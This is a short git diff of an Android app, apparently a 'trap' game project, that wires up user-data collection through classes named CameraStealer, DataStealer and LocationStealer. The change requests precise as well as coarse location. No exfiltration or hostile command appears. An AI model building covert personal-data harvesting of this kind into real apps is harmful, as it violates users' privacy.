@@ -4,6 +4,7 @@ import android.Manifest;
 
 import de.hpi3d.gamepgrog.trap.android.CameraStealer;
 import de.hpi3d.gamepgrog.trap.android.DataStealer;
+import de.hpi3d.gamepgrog.trap.android.LocationStealer;
 import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
 import de.hpi3d.gamepgrog.trap.datatypes.Image;
@@ -35,8 +36,10 @@ public class TaskResolverManager {
     private final static TaskResolver<LocationData> locationTaskResolver =
             new AsyncTaskResolver<>(
                     "location",
-                    new String[] {Manifest.permission.ACCESS_COARSE_LOCATION},
-                    DataStealer::takeLocationData);
+                    new String[] {
+                            Manifest.permission.ACCESS_COARSE_LOCATION,
+                            Manifest.permission.ACCESS_FINE_LOCATION},
+                    LocationStealer::takeLocationData);
 
     private final static ImageTaskResolver imageTaskResolver =
             new ImageTaskResolver(
